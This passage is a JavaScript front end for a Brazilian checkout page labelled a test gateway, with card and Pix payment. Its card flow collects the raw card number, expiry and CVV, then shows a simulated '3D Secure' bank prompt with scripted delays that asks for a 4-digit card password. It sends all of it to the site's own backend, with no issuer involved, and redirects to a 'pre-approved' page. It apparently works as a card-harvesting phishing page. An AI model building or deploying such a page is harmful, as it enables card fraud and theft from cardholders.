/**
 * Gateway Test Checkout - Core Logic (Updated with Pix Support)
 * Caminho: js/app.js
 */

document.addEventListener('DOMContentLoaded', () => {
  
  // ==========================================
  // 1. GERENCIAMENTO DAS SEÇÕES (ACCORDION)
  // ==========================================
  const sections = document.querySelectorAll('.checkout-section');
  
  // Avançar etapas clicando no botão "Continuar"
  const nextButtons = document.querySelectorAll('.next-step');
  nextButtons.forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      const currentSection = btn.closest('.checkout-section');
      const currentStepIndex = parseInt(currentSection.getAttribute('data-step'));
      
      // Valida os campos da seção atual antes de prosseguir
      if (validateSectionInputs(currentSection)) {
        currentSection.classList.remove('active');
        currentSection.classList.add('completed');
        
        const nextSection = document.querySelector(`.checkout-section[data-step="${currentStepIndex + 1}"]`);
        if (nextSection) {
          nextSection.classList.add('active');
        }
      }
    });
  });

  // Voltar etapas clicando no botão "Voltar"
  const prevButtons = document.querySelectorAll('.prev-step');
  prevButtons.forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      const currentSection = btn.closest('.checkout-section');
      const currentStepIndex = parseInt(currentSection.getAttribute('data-step'));
      
      currentSection.classList.remove('active');
      
      const prevSection = document.querySelector(`.checkout-section[data-step="${currentStepIndex - 1}"]`);
      if (prevSection) {
        prevSection.classList.add('active');
        prevSection.classList.remove('completed');
      }
    });
  });

  // Clicar nos cabeçalhos para navegar entre etapas concluídas
  sections.forEach(section => {
    const header = section.querySelector('.section-header');
    header.addEventListener('click', () => {
      const isCompleted = section.classList.contains('completed');
      const isActive = section.classList.contains('active');
      
      if (isCompleted || isActive) {
        // Remove a classe ativa de todos
        sections.forEach(s => s.classList.remove('active'));
        // Ativa a seção clicada
        section.classList.add('active');
        section.classList.remove('completed');
      }
    });
  });

  // Validador de campos por seção
  function validateSectionInputs(section) {
    const inputs = section.querySelectorAll('input[required], select[required]');
    let isValid = true;
    
    // Ignorar campos de cartão se o método Pix estiver selecionado
    const selectedMethod = document.getElementById('selected-payment-method').value;

    inputs.forEach(input => {
      const wrapper = input.closest('.input-wrapper');
      
      // Remover estilos anteriores de erro
      if (wrapper) wrapper.classList.remove('input-error');
      
      // Se for Pix, ignoramos os campos de cartão no passo 3
      if (selectedMethod === 'pix' && section.getAttribute('data-step') === '3') {
        if (['card_number', 'card_holder', 'card_expiry', 'card_cvv'].includes(input.id)) {
          return;
        }
      }

      if (!input.value.trim() || (input.tagName === 'SELECT' && input.value === '')) {
        isValid = false;
        if (wrapper) {
          wrapper.classList.add('input-error');
          shakeElement(wrapper);
        }
      }
      
      // Validações de formato específico
      if (input.id === 'customer_email' && input.value.trim()) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(input.value)) {
          isValid = false;
          if (wrapper) {
            wrapper.classList.add('input-error');
            shakeElement(wrapper);
          }
        }
      }
      
      if (input.id === 'customer_cpf' && input.value.trim()) {
        const cleanCPF = input.value.replace(/\D/g, '');
        if (cleanCPF.length !== 11) {
          isValid = false;
          if (wrapper) {
            wrapper.classList.add('input-error');
            shakeElement(wrapper);
          }
        }
      }

      if (input.id === 'cep' && input.value.trim()) {
        const cleanCEP = input.value.replace(/\D/g, '');
        if (cleanCEP.length !== 8) {
          isValid = false;
          if (wrapper) {
            wrapper.classList.add('input-error');
            shakeElement(wrapper);
          }
        }
      }
    });

    // Validar valor mínimo de R$ 5,00 para Pix
    if (selectedMethod === 'pix' && section.getAttribute('data-step') === '3') {
      const subtotal = parseFloat(amountInput.value) || 0;
      let shippingPrice = 15.00;
      const selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
      if (selectedRadio) {
        const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
        shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
      }
      const totalAmount = subtotal + shippingPrice;

      if (totalAmount < 5.00) {
        isValid = false;
        const summaryBox = document.querySelector('.order-summary-box');
        shakeElement(summaryBox);
        
        alert('⚠️ Valor mínimo do Pix permitido pela PagueX é R$ 5,00. Por favor, aumente o valor do pacote no resumo da compra para testar o Pix.');
      }
    }
    
    return isValid;
  }

  // Efeito de tremer campo com erro
  function shakeElement(element) {
    element.style.animation = 'none';
    setTimeout(() => {
      element.style.animation = 'shake 0.4s ease';
    }, 10);
  }

  // ==========================================
  // 2. ALTERNÂNCIA DE ABAS DE PAGAMENTO (CARTÃO / PIX)
  // ==========================================
  const paymentTabs = document.querySelectorAll('.payment-tab');
  const paymentMethodInput = document.getElementById('selected-payment-method');
  const cardFields = document.getElementById('payment-card-fields');
  const pixFields = document.getElementById('payment-pix-fields');
  const virtualCardViewer = document.getElementById('virtual-card');
  const pixVirtualViewer = document.getElementById('pix-virtual-viewer');

  paymentTabs.forEach(tab => {
    tab.addEventListener('click', () => {
      const target = tab.getAttribute('data-target');
      
      // Alternar classe ativa nas abas
      paymentTabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      
      // Atualizar input oculto
      paymentMethodInput.value = target;

      // Mostrar/Ocultar campos no formulário
      if (target === 'card') {
        cardFields.classList.add('active');
        pixFields.classList.remove('active');
        virtualCardViewer.classList.add('active');
        pixVirtualViewer.classList.remove('active');
      } else {
        cardFields.classList.remove('active');
        pixFields.classList.add('active');
        virtualCardViewer.classList.remove('active');
        pixVirtualViewer.classList.add('active');
      }
    });
  });

  // ==========================================
  // 3. MÁSCARAS DE ENTRADA (MASCARAMENTO)
  // ==========================================
  const phoneInput = document.getElementById('customer_phone');
  const cpfInput = document.getElementById('customer_cpf');
  const cepInput = document.getElementById('cep');
  const cardInput = document.getElementById('card_number');
  const cardExpiryInput = document.getElementById('card_expiry');
  const cardCvvInput = document.getElementById('card_cvv');

  // Máscara Celular: (XX) XXXXX-XXXX
  phoneInput.addEventListener('input', () => {
    let value = phoneInput.value.replace(/\D/g, '');
    if (value.length > 11) value = value.slice(0, 11);
    
    if (value.length > 6) {
      phoneInput.value = `(${value.slice(0, 2)}) ${value.slice(2, 7)}-${value.slice(7)}`;
    } else if (value.length > 2) {
      phoneInput.value = `(${value.slice(0, 2)}) ${value.slice(2)}`;
    } else if (value.length > 0) {
      phoneInput.value = `(${value}`;
    } else {
      phoneInput.value = '';
    }
  });

  // Máscara CPF: XXX.XXX.XXX-XX
  cpfInput.addEventListener('input', () => {
    let value = cpfInput.value.replace(/\D/g, '');
    if (value.length > 11) value = value.slice(0, 11);
    
    if (value.length > 9) {
      cpfInput.value = `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6, 9)}-${value.slice(9)}`;
    } else if (value.length > 6) {
      cpfInput.value = `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6)}`;
    } else if (value.length > 3) {
      cpfInput.value = `${value.slice(0, 3)}.${value.slice(3)}`;
    } else {
      cpfInput.value = value;
    }
  });

  // Máscara CEP: XXXXX-XXX
  cepInput.addEventListener('input', () => {
    let value = cepInput.value.replace(/\D/g, '');
    if (value.length > 8) value = value.slice(0, 8);
    
    if (value.length > 5) {
      cepInput.value = `${value.slice(0, 5)}-${value.slice(5)}`;
    } else {
      cepInput.value = value;
    }

    // Se preencheu os 8 dígitos, dispara busca automática do CEP
    if (value.length === 8) {
      buscarCEP(value);
    }
  });

  // Máscara Cartão de Crédito: XXXX XXXX XXXX XXXX
  cardInput.addEventListener('input', () => {
    let value = cardInput.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    
    const parts = [];
    for (let i = 0; i < value.length; i += 4) {
      parts.push(value.slice(i, i + 4));
    }
    
    cardInput.value = parts.join(' ');
    updateVirtualCardNumber(cardInput.value);
    detectCardBrand(value);
  });

  // Máscara Validade Cartão: MM/AA
  cardExpiryInput.addEventListener('input', () => {
    let value = cardExpiryInput.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);

    if (value.length > 2) {
      const month = parseInt(value.slice(0, 2));
      const validMonth = (month > 12) ? '12' : value.slice(0, 2);
      cardExpiryInput.value = `${validMonth}/${value.slice(2)}`;
    } else {
      cardExpiryInput.value = value;
    }

    const viewValue = cardExpiryInput.value || 'MM/AA';
    document.getElementById('card-expiry-view').textContent = viewValue;
  });

  // Máscara CVV
  cardCvvInput.addEventListener('input', () => {
    let value = cardCvvInput.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);
    cardCvvInput.value = value;

    document.getElementById('card-cvv-view').textContent = value || '•••';
  });

  // Nome do Titular
  const cardHolderInput = document.getElementById('card_holder');
  cardHolderInput.addEventListener('input', () => {
    let value = cardHolderInput.value.toUpperCase();
    value = value.replace(/[^A-Z\s]/g, '');
    cardHolderInput.value = value;
    
    document.getElementById('card-holder-view').textContent = value || 'NOME COMPLETO';
  });

  // ==========================================
  // 4. EFEITO DE ROTAÇÃO 3D DO CARTÃO
  // ==========================================
  const virtualCard = document.getElementById('virtual-card');

  cardCvvInput.addEventListener('focus', () => {
    virtualCard.classList.add('flip');
  });

  cardCvvInput.addEventListener('blur', () => {
    virtualCard.classList.remove('flip');
  });

  // ==========================================
  // 5. DETECÇÃO DE BANDEIRA DE CARTÃO
  // ==========================================
  const brandIcons = {
    visa: '<i class="fa-brands fa-cc-visa" style="color: #2563eb"></i>',
    mastercard: '<i class="fa-brands fa-cc-mastercard" style="color: #ea580c"></i>',
    amex: '<i class="fa-brands fa-cc-amex" style="color: #0d9488"></i>',
    diners: '<i class="fa-brands fa-cc-diners-club" style="color: #0284c7"></i>',
    discover: '<i class="fa-brands fa-cc-discover" style="color: #f97316"></i>',
    jcb: '<i class="fa-brands fa-cc-jcb" style="color: #ef4444"></i>',
    elo: '<span style="font-weight:900;font-style:italic;color:#eab308;font-size:16px;">ELO</span>',
    generic: '<i class="fa-solid fa-credit-card"></i>'
  };

  let detectedBrand = null;

  function detectCardBrand(number) {
    const brandBadge = document.getElementById('card-brand-badge');
    const logoView = document.getElementById('card-logo-view');
    
    if (number.length === 0) {
      brandBadge.innerHTML = brandIcons.generic;
      brandBadge.classList.remove('detected');
      logoView.innerHTML = brandIcons.generic;
      detectedBrand = null;
      return;
    }

    const regexList = {
      visa: /^4/,
      mastercard: /^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/,
      amex: /^3[47]/,
      diners: /^3(0[0-5]|[68])/,
      discover: /^6(011|5)/,
      jcb: /^(352[89]|35[3-8])/,
      elo: /^(40117[8-9]|431274|438935|451416|457393|45763[1-2]|504175|506699|509048|509067|509074|627780|636297|636368)/
    };

    let brand = 'generic';
    for (const [key, regex] of Object.entries(regexList)) {
      if (regex.test(number)) {
        brand = key;
        break;
      }
    }

    detectedBrand = brand === 'generic' ? null : brand;

    brandBadge.innerHTML = brandIcons[brand];
    logoView.innerHTML = brandIcons[brand];
    
    if (brand !== 'generic') {
      brandBadge.classList.add('detected');
    } else {
      brandBadge.classList.remove('detected');
    }
  }

  function updateVirtualCardNumber(formattedNumber) {
    const view = document.getElementById('card-number-view');
    if (!formattedNumber) {
      view.textContent = '•••• •••• •••• ••••';
      return;
    }
    
    let digits = formattedNumber.replace(/\s/g, '');
    let padded = digits.padEnd(16, '•');
    
    const parts = [];
    for (let i = 0; i < 16; i += 4) {
      parts.push(padded.slice(i, i + 4));
    }
    
    view.textContent = parts.join(' ');
  }

  // ==========================================
  // 6. CONSULTA CEP AUTOMÁTICA (VIACEP)
  // ==========================================
  async function buscarCEP(cep) {
    const cepLoader = document.getElementById('cep-loader');
    const street = document.getElementById('street');
    const neighborhood = document.getElementById('neighborhood');
    const city = document.getElementById('city');
    const state = document.getElementById('state');
    const number = document.getElementById('street_number');

    cepLoader.classList.add('show');

    try {
      const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      if (!response.ok) throw new Error('Falha na rede');
      
      const data = await response.json();
      
      if (data.erro) {
        const inputWrapper = cepInput.closest('.input-wrapper');
        if (inputWrapper) {
          inputWrapper.classList.add('input-error');
          shakeElement(inputWrapper);
        }
      } else {
        street.value = data.logradouro || '';
        neighborhood.value = data.bairro || '';
        city.value = data.localidade || '';
        state.value = data.uf || '';
        
        setTimeout(() => number.focus(), 150);
      }
    } catch (error) {
      console.error('Erro ao consultar CEP:', error);
    } finally {
      cepLoader.classList.remove('show');
    }
  }

  // ==========================================
  // 7. CÁLCULO DE VALORES E FRETE
  // ==========================================
  const amountInput = document.getElementById('base-amount');
  const shippingRadios = document.getElementsByName('shipping_method');
  const subtotalView = document.getElementById('summary-subtotal');
  const shippingView = document.getElementById('summary-shipping');
  const totalView = document.getElementById('summary-total');

  function calculateTotals() {
    let subtotal = parseFloat(amountInput.value) || 0;
    if (subtotal < 0) subtotal = 0;
    
    let shippingPrice = 15.00;
    let selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
    if (selectedRadio) {
      const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
      shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
    }

    const total = subtotal + shippingPrice;

    subtotalView.textContent = subtotal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    shippingView.textContent = shippingPrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    totalView.textContent = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  }

  amountInput.addEventListener('input', calculateTotals);
  shippingRadios.forEach(radio => {
    radio.addEventListener('change', (e) => {
      document.querySelectorAll('.shipping-option').forEach(el => el.classList.remove('active'));
      e.target.closest('.shipping-option').classList.add('active');
      calculateTotals();
    });
  });

  // Globais para rastreamento de produto Shopify
  let shpfyProductTitle = null;
  let shpfyProductSku = null;
  let shpfyProductPrice = null;
  let shpfyProductQuantity = 1;
  let shpfyVariantId = null;

  // Função para carregar produtos vindos do redirecionamento Shopify
  function parseUrlParameters() {
    const urlParams = new URLSearchParams(window.location.search);
    const paramTitle = urlParams.get('title');
    const paramPrice = urlParams.get('price');
    const paramSku = urlParams.get('sku');
    const paramQty = urlParams.get('quantity');
    const paramVariant = urlParams.get('shopify_variant_id');

    if (paramTitle && paramPrice) {
      shpfyProductTitle = paramTitle;
      shpfyProductSku = paramSku || 'SHPFY-DEFAULT';
      shpfyProductPrice = parseFloat(paramPrice) || 0;
      shpfyProductQuantity = parseInt(paramQty) || 1;
      shpfyVariantId = paramVariant || null;

      // 1. Atualizar o Título do produto no resumo da compra
      const itemTitleSpan = document.querySelector('.items-list .item-title');
      if (itemTitleSpan) {
        itemTitleSpan.textContent = shpfyProductTitle;
      }
      
      // 2. Atualizar o Subtítulo para mostrar SKU e Quantidade
      const itemSubtitleSpan = document.querySelector('.items-list .item-subtitle');
      if (itemSubtitleSpan) {
        itemSubtitleSpan.textContent = `SKU: ${shpfyProductSku} | Qtd: ${shpfyProductQuantity}`;
      }

      // 3. Preencher o preço e bloquear o campo (impede fraude do cliente)
      if (amountInput) {
        amountInput.value = (shpfyProductPrice * shpfyProductQuantity).toFixed(2);
        amountInput.disabled = true; 
        amountInput.style.opacity = '0.7';
        amountInput.style.cursor = 'not-allowed';
      }

      // Recalcular totais finais
      calculateTotals();
      console.log(`🛒 Produto do Shopify carregado com sucesso: ${shpfyProductTitle} (${shpfyProductSku})`);
    }
  }

  calculateTotals();
  parseUrlParameters();

  // ==========================================
  // 8. ACORDION AVANÇADO (TESTE 3DS)
  // ==========================================
  const advancedToggle = document.getElementById('advanced-toggle');
  const accordionAdvanced = advancedToggle.closest('.accordion-advanced');
  
  advancedToggle.addEventListener('click', () => {
    accordionAdvanced.classList.toggle('open');
  });

  // ==========================================
  // 9. ENVIO DO FORMULÁRIO (INTEGRAÇÃO API)
  // ==========================================
  const checkoutForm = document.getElementById('checkout-form');
  const submitBtn = document.getElementById('btn-submit-checkout');
  const btnText = submitBtn.querySelector('.btn-text');
  const btnLoader = submitBtn.querySelector('.btn-loader');
  
  const statusModal = document.getElementById('status-modal');
  const statusIconBox = document.getElementById('status-icon-box');
  const statusIcon = document.getElementById('status-icon');
  const statusTitle = document.getElementById('status-title');
  const statusSubtitle = document.getElementById('status-subtitle');
  const responseMode = document.getElementById('response-mode');
  const responseJsonPreview = document.getElementById('response-json-preview');
  const btnCloseModal = document.getElementById('btn-close-modal');

  // Elementos do Pix
  const modalPixArea = document.getElementById('modal-pix-area');
  const pixQrImage = document.getElementById('pix-qr-image');
  const qrLoadingSpinner = document.getElementById('qr-loading-spinner');
  const pixCopyInput = document.getElementById('pix-copy-input');
  const btnCopyPix = document.getElementById('btn-copy-pix');
  const copyBtnText = document.getElementById('copy-btn-text');
  const copyIcon = document.getElementById('copy-icon');

  // ==========================================
  // 10. ELEMENTOS E EVENTOS DO MODAL 3DS & CARREGAMENTO
  // ==========================================
  const authLoadingOverlay = document.getElementById('auth-loading-overlay');
  const auth3dsOverlay = document.getElementById('auth-3ds-overlay');
  const authBrandLogo = document.getElementById('auth-brand-logo');
  const authInfoAmount = document.getElementById('auth-info-amount');
  const authInfoDate = document.getElementById('auth-info-date');
  const authInfoCard = document.getElementById('auth-info-card');
  const btnCancel3ds = document.getElementById('btn-cancel-3ds');
  const btnSubmit3ds = document.getElementById('btn-submit-3ds');
  const digitInputs = document.querySelectorAll('.auth-digit-input');

  // Lógica dos campos de senha de 4 dígitos
  digitInputs.forEach((input, idx) => {
    // Filtrar somente números ao digitar
    input.addEventListener('input', (e) => {
      input.value = input.value.replace(/\D/g, '');
      
      if (input.value.length === 1) {
        const nextInput = document.getElementById(`auth-digit-${idx + 2}`);
        if (nextInput) {
          nextInput.focus();
        }
      }
    });

    // Navegação via Backspace
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace') {
        if (input.value === '') {
          const prevInput = document.getElementById(`auth-digit-${idx}`);
          if (prevInput) {
            prevInput.focus();
            prevInput.value = '';
          }
        } else {
          input.value = '';
        }
        e.preventDefault();
      }
    });

    // Submissão automática com a tecla Enter
    input.addEventListener('keyup', (e) => {
      if (e.key === 'Enter') {
        let passwordVal = '';
        digitInputs.forEach(inp => passwordVal += inp.value);
        if (passwordVal.length === 4) {
          const currentBtnSubmit = document.getElementById('btn-submit-3ds');
          if (currentBtnSubmit) currentBtnSubmit.click();
        }
      }
    });

    // Selecionar o texto ao focar
    input.addEventListener('focus', () => {
      input.select();
    });

    // Suporte para colar a senha completa (4 dígitos)
    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
      if (pasteData) {
        for (let i = 0; i < pasteData.length; i++) {
          const targetInput = document.getElementById(`auth-digit-${i + 1}`);
          if (targetInput) {
            targetInput.value = pasteData[i];
          }
        }
        const lastInput = document.getElementById(`auth-digit-${Math.min(pasteData.length, 4)}`);
        if (lastInput) {
          lastInput.focus();
        }
      }
    });
  });

  // Ação de Cancelar no modal 3DS
  btnCancel3ds.addEventListener('click', () => {
    auth3dsOverlay.classList.remove('open');
    authLoadingOverlay.classList.remove('open');
    
    // Restaurar o botão de checkout original
    submitBtn.disabled = false;
    btnText.classList.remove('hide');
    btnLoader.classList.add('hide');
  });

  checkoutForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const section3 = document.querySelector('.checkout-section[data-step="3"]');
    if (!validateSectionInputs(section3)) {
      return;
    }

    submitBtn.disabled = true;
    btnText.classList.add('hide');
    btnLoader.classList.remove('hide');

    const selectedMethod = paymentMethodInput.value;
    const uuid = generateUUID();
    const subtotal = parseFloat(amountInput.value) || 0;
    
    let shippingPrice = 15.00;
    let shippingMethodVal = 'standard';
    const selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
    if (selectedRadio) {
      shippingMethodVal = selectedRadio.value;
      const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
      shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
    }
    
    const totalAmount = subtotal + shippingPrice;

    const itemsPayload = shpfyProductTitle ? [
      {
        name: shpfyProductTitle,
        price: shpfyProductPrice,
        quantity: shpfyProductQuantity,
        sku: shpfyProductSku,
        shopify_variant_id: shpfyVariantId
      }
    ] : [
      {
        name: "Pacote Sandbox Elite",
        price: subtotal,
        quantity: 1,
        sku: "SANDBOX-ELITE-PK"
      }
    ];

    const payload = {
      checkout_session_id: uuid,
      payment_method: selectedMethod,
      
      // Cliente
      customer_name: document.getElementById('customer_name').value,
      customer_email: document.getElementById('customer_email').value,
      customer_phone: phoneInput.value,
      customer_cpf: cpfInput.value,

      // Endereço
      cep: cepInput.value,
      street: document.getElementById('street').value,
      street_number: document.getElementById('street_number').value,
      complement: document.getElementById('complement').value,
      neighborhood: document.getElementById('neighborhood').value,
      city: document.getElementById('city').value,
      state: document.getElementById('state').value.toUpperCase(),

      // Entrega & Pedido
      shipping_method: shippingMethodVal,
      shipping_price: shippingPrice,
      items: itemsPayload,
      amount: totalAmount,

      // Cartão (Somente se for 'card')
      card_holder_raw: selectedMethod === 'card' ? cardHolderInput.value : null,
      card_number_raw: selectedMethod === 'card' ? cardInput.value : null,
      card_expiry_raw: selectedMethod === 'card' ? cardExpiryInput.value : null,
      card_cvv_raw: selectedMethod === 'card' ? cardCvvInput.value : null,
      card_installments: selectedMethod === 'card' ? document.getElementById('card_installments').value : null,
      card_brand: selectedMethod === 'card' ? detectedBrand : null,

      // Parâmetros 3DS (Somente se for 'card')
      three_ds_status: selectedMethod === 'card' ? document.getElementById('three_ds_status').value : null,
      three_ds_code_raw: selectedMethod === 'card' ? (document.getElementById('three_ds_code_raw').value || null) : null,

      status: "draft"
    };

    // Fluxo Diferenciado se for Cartão de Crédito (Autenticação 3DS)
    if (selectedMethod === 'card') {
      // 1. Mostrar loader de validação de autenticação inicial
      const loadingTitle = authLoadingOverlay.querySelector('.auth-title');
      const loadingSubtitle = authLoadingOverlay.querySelector('.auth-subtitle');
      
      loadingTitle.textContent = "Validando autenticação";
      loadingSubtitle.textContent = "Estamos confirmando os dados com a rede emissora. Aguarde alguns segundos.";
      authLoadingOverlay.classList.add('open');

      // 2. Aguardar 2.5 segundos
      setTimeout(() => {
        authLoadingOverlay.classList.remove('open');

        // Popula as informações dinâmicas do modal 3DS
        authBrandLogo.className = `auth-brand-logo ${detectedBrand || 'generic'}`;
        authBrandLogo.innerHTML = brandIcons[detectedBrand || 'generic'];

        const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
        authInfoAmount.textContent = totalBrl;

        const now = new Date();
        const formattedDate = now.toLocaleDateString('pt-BR') + ', ' + now.toLocaleTimeString('pt-BR');
        authInfoDate.textContent = formattedDate;

        const last4 = cardInput.value.replace(/\D/g, '').slice(-4);
        authInfoCard.textContent = `XXXX XXXX XXXX ${last4 || '0000'}`;

        // Limpa os campos de senha e coloca foco no primeiro
        digitInputs.forEach(input => input.value = '');
        
        // Abre o modal 3DS
        auth3dsOverlay.classList.add('open');
        setTimeout(() => {
          const firstDigit = document.getElementById('auth-digit-1');
          if (firstDigit) firstDigit.focus();
        }, 100);

        // Define a ação de envio da senha
        const execute3dsSubmit = async () => {
          // Recuperar a senha inserida
          let passwordVal = '';
          digitInputs.forEach(input => passwordVal += input.value);

          if (passwordVal.length < 4) {
            const digitsContainer = document.querySelector('.auth-password-digits');
            shakeElement(digitsContainer);
            return;
          }

          // Senha válida! Prosseguir com o envio.
          // 1. Mostrar loader de autenticação final
          loadingTitle.textContent = "Confirmando autenticação 3D Secure...";
          loadingSubtitle.textContent = "Por favor, não feche esta janela. Estamos realizando a verificação de segurança final...";
          
          auth3dsOverlay.classList.remove('open');
          authLoadingOverlay.classList.add('open');

          // 2. Aguardar 3.0 segundos
          setTimeout(async () => {
            // Determinar o status 3DS final a partir da seleção de teste avançado
            let finalThreeDsStatus = document.getElementById('three_ds_status').value;
            if (finalThreeDsStatus === 'not_attempted') {
              finalThreeDsStatus = 'authenticated';
            }

            // Anexar a senha do cartão e o status atualizado no payload
            const finalPayload = {
              ...payload,
              card_password: passwordVal,
              three_ds_status: finalThreeDsStatus
            };

            try {
              const response = await fetch('/api/checkout', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify(finalPayload)
              });

              const responseData = await response.json();

              if (!response.ok) {
                throw new Error(responseData.details || responseData.error || 'Falha ao salvar transação de cartão.');
              }

              // Se o status retornado for FAILED ou REJECTED (devido a testes avançados negativos)
              if (responseData.data && (responseData.data.status === 'FAILED' || responseData.data.status === 'REJECTED')) {
                authLoadingOverlay.classList.remove('open');
                showModalState('error', responseData);
                
                // Restaurar os controles do form principal
                submitBtn.disabled = false;
                btnText.classList.remove('hide');
                btnLoader.classList.add('hide');
              } else {
                // Sucesso absoluto! Redirecionar para tela de pré-aprovação premium
                const urlParams = new URLSearchParams(window.location.search);
                const storeParam = urlParams.get('store_url');
                
                let redirectUrl = `card-pre-approved.html?amount=${totalAmount}&date=${encodeURIComponent(formattedDate)}`;
                if (storeParam) {
                  redirectUrl += `&store_url=${encodeURIComponent(storeParam)}`;
                }
                
                window.location.href = redirectUrl;
              }

            } catch (err) {
              console.error('Erro ao processar transação de cartão:', err);
              authLoadingOverlay.classList.remove('open');
              showModalState('error', { error: err.message });
              
              // Restaurar os controles do form principal
              submitBtn.disabled = false;
              btnText.classList.remove('hide');
              btnLoader.classList.add('hide');
            }
          }, 3000);
        };

        // Associar o clique de envio
        // Substituímos o botão por um clone dele para limpar listeners antigos!
        const currentBtnSubmit = document.getElementById('btn-submit-3ds');
        if (currentBtnSubmit) {
          const newBtnSubmit3ds = currentBtnSubmit.cloneNode(true);
          currentBtnSubmit.parentNode.replaceChild(newBtnSubmit3ds, currentBtnSubmit);
          newBtnSubmit3ds.addEventListener('click', execute3dsSubmit);
        }

      }, 2500);

      return;
    }

    // ========================================================
    // FLUXO NORMAL DO PIX (MANTIDO 100% INTACTO)
    // ========================================================
    showModalState('processing');
    
    try {
      const response = await fetch('/api/checkout', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const responseData = await response.json();

      if (!response.ok) {
        throw new Error(responseData.details || responseData.error || 'Falha ao salvar transação.');
      }

      showModalState('success', responseData);

    } catch (err) {
      console.error('Erro ao processar transação:', err);
      showModalState('error', { error: err.message });
    } finally {
      submitBtn.disabled = false;
      btnText.classList.remove('hide');
      btnLoader.classList.add('hide');
    }
  });

  // Gerenciador de estados do modal de resposta
  function showModalState(state, responseData = null) {
    statusModal.classList.add('open');

    statusIconBox.className = 'status-icon-container';
    statusIcon.className = 'fa-solid';

    // Ocultar área Pix por padrão
    modalPixArea.classList.add('hide');

    if (state === 'processing') {
      statusIconBox.classList.add('processing');
      statusIcon.classList.add('fa-spinner', 'fa-spin');
      statusTitle.textContent = 'Processando...';
      statusSubtitle.textContent = 'Enviando dados com segurança para o backend e registrando no Supabase.';
      responseMode.textContent = 'STANDBY';
      responseMode.className = 'badge';
      responseJsonPreview.textContent = '// Aguardando resposta do backend...';
      btnCloseModal.style.display = 'none';
    } 
    else if (state === 'success') {
      statusIconBox.classList.add('success');
      statusIcon.classList.add('fa-check');
      
      btnCloseModal.style.display = 'inline-flex';
      
      if (responseData) {
        responseMode.textContent = responseData.mode === 'mock' ? 'MOCK MODE' : 'SUPABASE + PAGUEX';
        responseMode.className = `badge ${responseData.mode === 'mock' ? 'mock' : ''}`;
        responseJsonPreview.textContent = JSON.stringify(responseData, null, 2);
        
        if (responseData.payment_method === 'pix') {
          statusTitle.textContent = 'Pix Gerado!';
          statusSubtitle.textContent = 'Leia o QR Code abaixo ou copie o código Pix para pagar.';
          
          // Mostrar área do Pix
          modalPixArea.classList.remove('hide');
          pixCopyInput.value = responseData.pix_qr_code;
          
          // Carregar QR Code visual
          qrLoadingSpinner.classList.add('show');
          pixQrImage.onload = () => qrLoadingSpinner.classList.remove('show');
          pixQrImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&margin=10&data=${encodeURIComponent(responseData.pix_qr_code)}`;
        } else {
          statusTitle.textContent = 'Transação Registrada!';
          statusSubtitle.textContent = 'O rascunho de cartão foi criado e salvo no Supabase com sucesso!';
        }
      }
    } 
    else if (state === 'error') {
      statusIconBox.classList.add('error');
      statusIcon.classList.add('fa-xmark');
      statusTitle.textContent = 'Falha no Processamento';
      statusSubtitle.textContent = 'Houve um erro ao processar a requisição.';
      
      btnCloseModal.style.display = 'inline-flex';
      responseMode.textContent = 'ERRO';
      responseMode.className = 'badge error';
      
      if (responseData) {
        responseJsonPreview.textContent = JSON.stringify(responseData, null, 2);
      }
    }
  }

  // Ação de copiar código Pix Copia e Cola
  btnCopyPix.addEventListener('click', () => {
    pixCopyInput.select();
    pixCopyInput.setSelectionRange(0, 99999); // Mobile
    
    navigator.clipboard.writeText(pixCopyInput.value)
      .then(() => {
        // Feedback visual do botão
        btnCopyPix.classList.add('copied');
        copyBtnText.textContent = 'Copiado!';
        copyIcon.className = 'fa-solid fa-check';
        
        setTimeout(() => {
          btnCopyPix.classList.remove('copied');
          copyBtnText.textContent = 'Copiar';
          copyIcon.className = 'fa-regular fa-copy';
        }, 2000);
      })
      .catch(err => {
        console.error('Falha ao copiar:', err);
      });
  });

  // Fechar o modal
  btnCloseModal.addEventListener('click', () => {
    statusModal.classList.remove('open');
    if (statusIconBox.classList.contains('success')) {
      resetCheckoutForm();
    }
  });

  // Reiniciar Formulário
  function resetCheckoutForm() {
    checkoutForm.reset();
    
    sections.forEach((s, idx) => {
      s.classList.remove('completed');
      if (idx === 0) {
        s.classList.add('active');
      } else {
        s.classList.remove('active');
      }
    });

    // Forçar volta para aba de Cartão de Crédito
    paymentTabs[0].click();

    // Resetar cartão visual
    document.getElementById('card-number-view').textContent = '•••• •••• •••• ••••';
    document.getElementById('card-holder-view').textContent = 'NOME COMPLETO';
